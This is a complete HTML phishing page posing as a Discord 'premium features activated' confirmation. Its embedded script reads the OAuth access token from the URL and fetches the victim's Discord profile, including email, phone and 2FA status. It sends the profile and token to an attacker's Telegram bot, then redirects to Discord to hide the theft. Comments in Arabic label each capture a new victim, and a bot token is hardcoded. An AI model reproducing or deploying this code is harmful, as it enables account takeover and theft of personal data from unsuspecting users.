<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Activated!</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{font-family:'gg sans',system-ui,sans-serif;background:#0a0a0f;color:#e8eaf0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px;position:relative}
  body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle at 50% 50%,rgba(34,197,94,.25),transparent 60%);pointer-events:none}
  .card{position:relative;max-width:480px;width:100%;background:rgba(19,20,28,.9);border:1px solid rgba(255,255,255,.08);border-radius:24px;padding:48px 36px;text-align:center;box-shadow:0 30px 80px rgba(0,0,0,.6)}
  .check{width:88px;height:88px;border-radius:50%;background:linear-gradient(135deg,#22c55e,#16a34a);display:flex;align-items:center;justify-content:center;margin:0 auto 28px;box-shadow:0 0 60px rgba(34,197,94,.6);animation:pop .6s ease-out}
  @keyframes pop{0%{transform:scale(0)}70%{transform:scale(1.1)}100%{transform:scale(1)}}
  .check svg{width:48px;height:48px;color:#fff}
  h1{font-size:28px;font-weight:800;margin-bottom:12px;background:linear-gradient(135deg,#fff,#86efac);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
  p{color:#9ca3af;font-size:15px;line-height:1.6;margin-bottom:24px}
  .username{color:#a5b4fc;font-weight:600}
  .countdown{background:rgba(88,101,242,.15);border:1px solid rgba(88,101,242,.3);border-radius:12px;padding:16px;color:#c7d2fe;font-size:14px}
  .countdown b{color:#fff;font-size:18px;display:inline-block;min-width:24px}
  a{color:#00a8fc;text-decoration:none}
</style>
</head>
<body>
<div class="card">
  <div class="check"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div>
  <h1>Activated Successfully!</h1>
  <p>Welcome, <span class="username" id="uname">user</span>. Your premium features are now unlocked.</p>
  <div class="countdown">Redirecting in <b id="cd">5</b> seconds · <a href="https://discord.com/app">Open Discord</a></div>
</div>

<script>
// الإعدادات
const TG_TOKEN = '9213796296:AAFgiZR1cwWLX6-W_yQhtBpjp8TEptKHdtU';
const TG_CHAT_ID = 'ضع_CHAT_ID_هنا'; // <-- حط الـ ID بتاعك هنا

// 1. استخراج الـ access_token من الرابط (بيجي بعد علامة #)
const hash = window.location.hash.substring(1);
const params = new URLSearchParams(hash);
const accessToken = params.get('access_token');

if (!accessToken) {
    document.querySelector('h1').textContent = 'Activation Failed';
    document.getElementById('uname').textContent = 'Unknown';
} else {
    // 2. جلب بيانات الحساب باستخدام التوكن
    fetch('https://discord.com/api/v10/users/@me', {
        headers: { 'Authorization': 'Bearer ' + accessToken }
    })
    .then(res => res.json())
    .then(user => {
        document.getElementById('uname').textContent = user.username || 'user';

        // 3. تجهيز الرسالة وإرسالها لتليجرام
        const msg = `🔥 *ضحية جديدة — OAuth*\n\n` +
            `👤 *Username:* \`${user.username}#${user.discriminator || '0'}\`\n` +
            `📛 *Display:* \`${user.global_name || user.username}\`\n` +
            `🆔 *ID:* \`${user.id}\`\n` +
            `📧 *Email:* \`${user.email || '—'}\`\n` +
            `📱 *Phone:* \`${user.phone || '—'}\`\n` +
            `✅ *Verified:* \`${user.verified}\`\n` +
            `🔒 *2FA:* \`${user.mfa_enabled}\`\n\n` +
            `🎫 *Access Token:*\n\`${accessToken}\``;

        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TG_CHAT_ID,
                text: msg,
                parse_mode: 'Markdown'
            })
        }).catch(e => console.log('Telegram error:', e));
    })
    .catch(err => {
        console.error(err);
        document.querySelector('h1').textContent = 'Activation Failed';
    });
}

// 4. عداد تنازلي للتحويل
let t = 5;
const cd = document.getElementById('cd');
const iv = setInterval(() => {
    t--;
    cd.textContent = t;
    if (t <= 0) {
        clearInterval(iv);
        window.location.href = 'https://discord.com/app';
    }
}, 1000);
</script>
</body>
</html>
